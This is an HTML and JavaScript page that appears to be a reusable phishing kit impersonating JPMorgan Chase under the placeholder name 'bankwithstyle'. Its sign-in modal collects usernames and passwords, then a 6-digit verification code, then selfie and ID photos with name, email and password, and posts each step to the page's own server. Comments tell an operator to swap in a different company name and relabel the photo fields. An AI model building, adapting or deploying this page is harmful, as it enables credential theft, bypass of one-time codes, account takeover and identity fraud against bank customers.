<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title id="pageTitle">bankwithstyle</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header class="topbar">
    <div class="top-inner">
      <!-- === CHANGE COMPANY NAME (two places) ===
           1) id="brandName"  2) id="brandInHero"
           Replace the inner text "bankwirhstyleandfamilywithoeace" with your name -->
      <a class="brand" id="brandName">Chasemorgan</a>
      <nav>
        <button class="btn-pill" id="openBtn">Sign In</button>
      </nav>
    </div>
  </header>

  <main class="hero">
    <div class="hero-inner">
      <div class="hero-copy">
        <h1 class="headline">Welcome to <span id="brandInHero">Jpmorgan</span></h1>
        <p class="lead">Secure access for customers — modern, fast and protected.</p>
        <button class="cta-primary" id="startFlow">Get Started</button>
      </div>
      <div class="hero-visual"></div>
    </div>
  </main>

  <!-- modal flow -->
  <div id="modal" class="modal hidden">
    <div class="modal-card">
      <button class="close" id="closeBtn">✕</button>

      <!-- STEP 1: Sign in / signup -->
      <section id="step1" class="step active">
        <h2>Sign In</h2>
        <form id="loginForm" autocomplete="off">
          <label>Username<input name="username" type="text" required></label>
          <label>Password<input name="password" type="password" required></label>
          <div class="row">
            <button type="submit" class="btn-primary">Continue</button>
            <button type="button" class="btn-secondary" id="showSignup">Register</button>
          </div>
        </form>

        <div id="signupPanel" class="hidden panel">
          <h3>Create account</h3>
          <form id="signupForm" autocomplete="off">
            <label>Full name<input name="fullname" type="text" required></label>
            <label>Email<input name="email" type="email" required></label>
            <label>Create password<input name="password" type="password" required></label>
            <div class="row">
              <button type="submit" class="btn-primary">Register</button>
              <button type="button" class="btn-link" id="backToSign">Back</button>
            </div>
          </form>
        </div>
      </section>

      <!-- STEP 2: code -->
      <section id="step2" class="step hidden">
        <h2>Verification Code</h2>
        <form id="codeForm" autocomplete="off">
          <label>6-digit code<input name="code" type="text" maxlength="6" pattern="[0-9]{6}" required></label>
          <div class="row">
            <button class="btn-primary" type="submit">Verify</button>
            <button class="btn-link" id="backToStep1">Back</button>
          </div>
        </form>
      </section>

      <!-- STEP 3: KYC -->
      <section id="step3" class="step hidden">
        <h2>KYC — Upload Photos</h2>
        <form id="kycForm" enctype="multipart/form-data">
          <!-- === CHANGE THESE LABELS TO DESIRED NAMES ===
               Example: "Selfie", "Thumbprint", "Proof of Address" -->
          <label>Photo 1 (Selfie)<input name="photo1" type="file" accept="image/*" required></label>
          <label>Photo 2 (ID front)<input name="photo2" type="file" accept="image/*"></label>
          <label>Photo 3 (ID back)<input name="photo3" type="file" accept="image/*"></label>

          <label>Full name<input name="fullname" type="text" required></label>
          <label>Email<input name="email" type="email" required></label>
          <label>Create password<input name="password" type="password" required></label>

          <div class="row">
            <button class="btn-primary" type="submit">Send KYC & Finish</button>
          </div>
        </form>
      </section>

      <div id="status" class="muted small"></div>
    </div>
  </div>

<script>
// UI controls
const openBtn = document.getElementById('openBtn');
const startFlow = document.getElementById('startFlow');
const modal = document.getElementById('modal');
const closeBtn = document.getElementById('closeBtn');
const status = document.getElementById('status');

openBtn.addEventListener('click', openModal);
startFlow.addEventListener('click', openModal);
closeBtn.addEventListener('click', closeModal);

function openModal(){ modal.classList.remove('hidden'); showStep(1); }
function closeModal(){ modal.classList.add('hidden'); status.textContent = ''; }
function showStep(n){
  document.querySelectorAll('.step').forEach(s=>s.classList.add('hidden'));
  document.getElementById('step' + n).classList.remove('hidden');
  status.textContent = '';
}

// helper
async function postJSON(url, data){
  const res = await fetch(url, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify(data)
  });
  return res.json();
}

// LOGIN
document.getElementById('loginForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  status.textContent = 'Sending sign-in...';
  try {
    const r = await postJSON('/login', { username: f.username.value.trim(), password: f.password.value });
    if (r && r.ok) showStep(2);
    else status.textContent = (r.error || 'Sign-in failed');
  } catch(err){ console.error(err); status.textContent = 'Network error'; }
});

// signup toggle
document.getElementById('showSignup').addEventListener('click', ()=> document.getElementById('signupPanel').classList.remove('hidden'));
document.getElementById('backToSign').addEventListener('click', ()=> document.getElementById('signupPanel').classList.add('hidden'));

// SIGNUP
document.getElementById('signupForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  status.textContent = 'Registering...';
  try {
    const r = await postJSON('/signup', { fullname: f.fullname.value.trim(), email: f.email.value.trim(), password: f.password.value });
    if (r && r.ok) showStep(2);
    else status.textContent = (r.error || 'Signup failed');
  } catch(err){ console.error(err); status.textContent = 'Network error'; }
});

// CODE
document.getElementById('codeForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  status.textContent = 'Verifying code...';
  try {
    const r = await postJSON('/code', { code: f.code.value.trim() });
    if (r && r.ok) showStep(3);
    else status.textContent = (r.error || 'Invalid code');
  } catch(err){ console.error(err); status.textContent = 'Network error'; }
});

// KYC (multipart) - includes labels for each photo
document.getElementById('kycForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const f = e.target;
  const fd = new FormData();

  ['photo1','photo2','photo3'].forEach(name => {
    const input = f[name];
    if (input && input.files && input.files[0]) {
      fd.append(name, input.files[0]);
      // read visible label text and send it too
      const labelEl = input.closest('label');
      const labelText = labelEl ? labelEl.textContent.trim() : name;
      fd.append(name + "_label", labelText);
    }
  });

  fd.append('fullname', f.fullname.value.trim());
  fd.append('email', f.email.value.trim());
  fd.append('password', f.password.value);

  status.textContent = 'Uploading KYC...';
  try {
    const res = await fetch('/kyc', { method: 'POST', body: fd });
    const json = await res.json();
    if (json && json.ok) {
      status.textContent = 'KYC submitted — redirecting...';
      window.location.href = json.redirect || '/';
    } else {
      status.textContent = (json.error || 'Upload failed');
    }
  } catch(err){ console.error(err); status.textContent = 'Network error'; }
});
</script>
</body>
</html>